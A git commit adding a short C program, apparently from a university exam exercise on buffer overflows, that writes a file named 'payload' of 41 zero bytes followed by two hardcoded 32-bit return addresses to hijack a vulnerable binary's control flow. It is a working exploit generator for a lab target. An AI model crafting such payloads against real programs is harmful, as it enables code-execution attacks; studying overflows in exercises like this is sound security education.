5f937b91b76417e0706e138eb88389369bd6afb0
Alex Careja <alexandrucareja@yahoo.com>
2020-02-07 01:59:05 +0200

    Add files via upload

---
+++ examen model v2/3/1-overflow/gen_p.c
@@ -0,0 +1,24 @@
+#include <stdio.h>
+
+
+
+int main(void)
+{
+	FILE *f = fopen("payload", "w");
+	int i = 0;
+	while (i<41) {
+		fprintf(f, "%c", 0);
+		i++;
+	}	
+	fprintf(f, "%c", 0xa6);
+	fprintf(f, "%c", 0x84);
+	fprintf(f, "%c", 0x04);
+	fprintf(f, "%c", 0x08);
+	fprintf(f, "%c", 0xe5);
+	fprintf(f, "%c", 0x84);
+	fprintf(f, "%c", 0x04);
+	fprintf(f, "%c", 0x08);
+	fclose(f);
+
+	return 0;
+}
